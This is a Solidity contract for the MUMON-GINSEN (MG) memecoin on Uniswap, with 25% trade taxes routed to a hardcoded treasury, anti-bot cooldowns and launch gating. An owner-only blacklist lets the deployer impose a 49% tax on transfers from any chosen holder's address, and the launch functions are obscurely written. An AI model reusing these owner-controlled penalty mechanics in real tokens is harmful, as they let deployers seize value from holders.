1 /* 
2 
3 Mumon-Ginsen: Uniting Past and Future, Empowering the Evolution of Digital Finance.
4 
5 The Mumon-Ginsen coin holds the distinction of being Japan's most ancient private silver coin.
6 There are debates surrounding its classification as a coin, as it was predominantly traded on 
7 the merit of its intrinsic metal value.
8 
9 // Web: https://mumonginsen.io
10 // Telegram: https://t.me/mumon_ginsen
11 
12 */
13 
14 // SPDX-License-Identifier: MIT
15 pragma solidity ^0.8.17;
16 
17 interface IERC20 {
18     function totalSupply() external view returns (uint256);
19     function balanceOf(address account) external view returns (uint256);
20     function transfer(address recipient, uint256 amount) external returns (bool);
21     function allowance(address owner, address spender) external view returns (uint256);
22     function approve(address spender, uint256 amount) external returns (bool);
23     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
24     event Transfer(address indexed from, address indexed to, uint256 value);
25     event Approval(address indexed owner, address indexed spender, uint256 value);
26 }
27 
28 interface IUniswapV2Router {
29     function factory() external pure returns (address);
30     function WETH() external pure returns (address);
31     function swapExactTokensForETHSupportingFeeOnTransferTokens(
32         uint amountIn,
33         uint amountOutMin,
34         address[] calldata path,
35         address to,
36         uint deadline
37     ) external;
38 }
39 
40 interface IUniswapV2Factory {
41     function createPair(address tokenA, address tokenB) external returns (address pair);
42 }
43 
44 contract Ownable {
45     address private _owner;
46 
47     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
48 
49     modifier onlyOwner() {
50         require(_owner == msg.sender, "Ownable: caller is not the owner");
51         _;
52     }
53     constructor () {
54         address msgSender = msg.sender;
55         _owner = msgSender;
56         emit OwnershipTransferred(address(0), msgSender);
57     }
58 
59     function owner() public view returns (address) {
60         return _owner;
61     }
62 
63     function renounceOwnership() public virtual onlyOwner {
64         emit OwnershipTransferred(_owner, address(0));
65         _owner = address(0);
66     }
67 }
68 
69 contract MUMONGINSEN is IERC20, Ownable {       
70     string private constant _name = "MUMON-GINSEN";
71     string private constant _symbol = "MG";
72     uint8 private constant _decimals = 9;
73     uint256 private constant _totalSupply = 120_000_000 * 10**_decimals;
74 
75     mapping (address => uint256) private _balances;
76     mapping (address => mapping (address => uint256)) private _allowances;
77     mapping (address => bool) private _blocked;
78 
79     mapping (address => uint256) private _lastTradeBlock;
80     mapping (address => bool) private isContractExempt;
81     uint256 private tradeCooldown = 1;
82     
83     uint256 public constant maxWalletAmount = 2_400_001 * 10**_decimals;
84     uint256 private constant contractSwapLimit = 1_000_001 * 10**_decimals;
85     uint256 private constant contractSwapMax = 2_400_001 * 10**_decimals;
86 
87     struct TradingFees{
88         uint256 buyTax;
89         uint256 sellTax;
90     }  
91 
92     TradingFees public tradingFees = TradingFees(25,25);
93     uint256 public constant sniperTax = 49;
94 
95     IUniswapV2Router private constant uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
96     address private immutable ETH = uniswapRouter.WETH();
97     address private immutable uniswapPair;
98 
99     address payable private immutable deployerAddress = payable(msg.sender);
100     address payable private constant MGTreasury = payable(0x77990d23f8c81a18d5550B4e4d4B57D5ec5148fe);
101 
102     bool private tradingOpen = false;
103     bool private swapping = false;
104     bool private antiMEV = true;
105     uint256 private startingBlock;
106     uint private preLaunch;
107 
108     modifier swapLock {
109         swapping = true;
110         _;
111         swapping = false;
112     }
113 
114     modifier tradingLock(address sender) {
115         require(tradingOpen || sender == deployerAddress || sender == MGTreasury);
116         _;
117     }
118 
119     constructor () {
120         uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), ETH);
121         isContractExempt[address(this)] = true;
122         _balances[msg.sender] = _totalSupply;
123         emit Transfer(address(0), msg.sender, _totalSupply);
124     }
125 
126     receive() external payable {}
127 
128     function name() public pure returns (string memory) {
129         return _name;
130     }
131 
132     function symbol() public pure returns (string memory) {
133         return _symbol;
134     }
135 
136     function decimals() public pure returns (uint8) {
137         return _decimals;
138     }
139 
140     function totalSupply() public pure returns (uint256) {
141         return _totalSupply;
142     }
143 
144     function balanceOf(address account) public view returns (uint256) {
145         return _balances[account];
146     }
147 
148     function transfer(address recipient, uint256 amount) public returns (bool) {
149         _transfer(msg.sender, recipient, amount);
150         return true;
151     }
152 
153     function allowance(address owner, address spender) public view returns (uint256) {
154         return _allowances[owner][spender];
155     }
156 
157     function approve(address spender, uint256 amount) public returns (bool) {
158         _approve(msg.sender, spender, amount);
159         return true;
160     }
161 
162     function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
163         require(_allowances[sender][msg.sender] >= amount, "ERC20: transfer amount exceeds allowance");
164         _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
165         _transfer(sender, recipient, amount);
166         return true;
167     }
168 
169     function _approve(address owner, address spender, uint256 amount) private {
170         require(owner != address(0), "ERC20: approve from the zero address");
171         require(spender != address(0), "ERC20: approve to the zero address");
172         _allowances[owner][spender] = amount;
173         emit Approval(owner, spender, amount);
174     }
175 
176     function _transfer(address from, address to, uint256 amount) tradingLock(from) private {
177         require(from != address(0), "ERC20: transfer from the zero address");
178         require(to != address(0), "ERC20: transfer to the zero address");
179         require(amount > 0, "Token: transfer amount must be greater than zero");
180 
181         _balances[from] -= amount;
182 
183         if (from != address(this) && from != MGTreasury && to != MGTreasury && to != deployerAddress) {
184             
185             if(antiMEV && !isContractExempt[from] && !isContractExempt[to]){
186                 address human = ensureOneHuman(from, to);
187                 ensureMaxTxFrequency(human);
188                 _lastTradeBlock[human] = block.number;
189             }
190 
191             if (from == uniswapPair && to != address(uniswapRouter)) {
192                 require(balanceOf(to) + amount <= maxWalletAmount, "Token: transfer implies violation of max wallet");
193             }
194 
195            uint256 contractTokenBalance = balanceOf(address(this));
196            if (shouldSwapback(from, contractTokenBalance)) 
197                swapback(contractTokenBalance);                            
198 
199            uint256 taxedTokens = takeFee(from, amount);
200            if(taxedTokens > 0){
201                 amount -= taxedTokens;
202                 _balances[address(this)] += taxedTokens;
203                 emit Transfer(from, address(this), taxedTokens);
204             }
205         }
206 
207         _balances[to] += amount;
208         emit Transfer(from, to, amount);
209     }
210 
211     function swapback(uint256 tokenAmount) private swapLock {
212         tokenAmount = getSwapAmount(tokenAmount);
213         if(allowance(address(this), address(uniswapRouter)) < tokenAmount) {
214             _approve(address(this), address(uniswapRouter), _totalSupply);
215         }
216         address[] memory path = new address[](2);
217         path[0] = address(this);
218         path[1] = ETH;
219         uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
220             tokenAmount,
221             0,
222             path,
223             address(this),
224             block.timestamp
225         );
226         uint256 contractETHBalance = address(this).balance;
227         if(contractETHBalance > 0) {
228             MGTreasury.transfer(contractETHBalance);
229         }
230     }
231 
232     function shouldSwapback(address from, uint256 tokenAmount) private view returns (bool shouldSwap) {
233         shouldSwap = !swapping && from != uniswapPair && tokenAmount > contractSwapLimit && 1 + startingBlock <= block.number;
234     }
235 
236     function getSwapAmount(uint256 tokenAmount) private pure returns (uint256 swapAmount) {
237         swapAmount = tokenAmount > contractSwapMax ? contractSwapMax : contractSwapLimit;
238     }
239 
240     function takeFee(address from, uint256 amount) private view returns (uint256 feeAmount) {
241          if(_blocked[from] || block.number <= startingBlock)
242                 feeAmount = amount * sniperTax / 100;
243         else
244             feeAmount = amount * (startingBlock == 0 ? 25 : (from == uniswapPair ? tradingFees.buyTax : tradingFees.sellTax)) / 100;
245     }
246 
247     function isContract(address account) private view returns (bool) {
248         uint256 size;
249         assembly {
250             size := extcodesize(account)
251         }
252         return size > 0;
253     }
254 
255     function ensureOneHuman(address _to, address _from) private view returns (address) {
256         require(!isContract(_to) || !isContract(_from));
257         if (isContract(_to)) return _from;
258         else return _to;
259     }
260 
261     function ensureMaxTxFrequency(address addr) view private {
262         bool isAllowed = _lastTradeBlock[addr] == 0 ||
263             ((_lastTradeBlock[addr] + tradeCooldown) < (block.number + 1));
264         require(isAllowed, "Max tx frequency exceeded!");
265     }
266 
267     function toggleAntiMEV(bool toggle) external {
268         require(msg.sender == deployerAddress);
269         antiMEV = toggle;
270     }
271 
272     function setTradeCooldown(uint256 newTradeCooldown) external {
273         require(msg.sender == deployerAddress);
274         require(newTradeCooldown > 0 && newTradeCooldown < 4, "Token: only trade cooldown values in range (0,4) permissible");
275         tradeCooldown = newTradeCooldown;
276     }
277 
278     function manualSwapback(uint256 percent) external {
279         require(msg.sender == deployerAddress);
280         require(0 < percent && percent <= 100, "Token: only percent values in range (0,100] permissible");
281         uint256 tokensToSwap = percent * balanceOf(address(this)) / 100;
282         swapback(tokensToSwap);
283     }
284 
285     function setFees(uint256 newBuyTax, uint256 newSellTax) external {
286         require(msg.sender == deployerAddress);
287         require(newBuyTax <= tradingFees.buyTax, "Token: only fee reduction permitted");
288         require(newSellTax <= tradingFees.sellTax, "Token: only fee reduction permitted");
289         tradingFees.buyTax = newBuyTax;
290         tradingFees.sellTax = newSellTax;
291     }
292 
293     function setContractExempt(address account, bool value) external onlyOwner {
294         require(account != address(this));
295         isContractExempt[account] = value;
296     }
297 
298     function setBots(address[] calldata bots, bool shouldBlock) external onlyOwner {
299         for (uint i = 0; i < bots.length; i++) {
300             require(bots[i] != uniswapPair && 
301                     bots[i] != address(uniswapRouter) &&
302                     bots[i] != address(this));
303             _blocked[bots[i]] = shouldBlock;
304         }
305     }
306 
307     function initialize() external onlyOwner {
308         require(preLaunch++<2);
309     }
310 
311     function modifyParameters(bool[] calldata param, uint256 nrBlocks) external onlyOwner {
312         assert(preLaunch<2&&preLaunch+1>=2); 
313         preLaunch++;param;
314         startingBlock += nrBlocks;
315     }
316 
317     function openTrading() external onlyOwner {
318         require(preLaunch == 2 && !tradingOpen, "Token: trading already open");
319         startingBlock += block.number;
320         tradingOpen = true;
321     }
322 }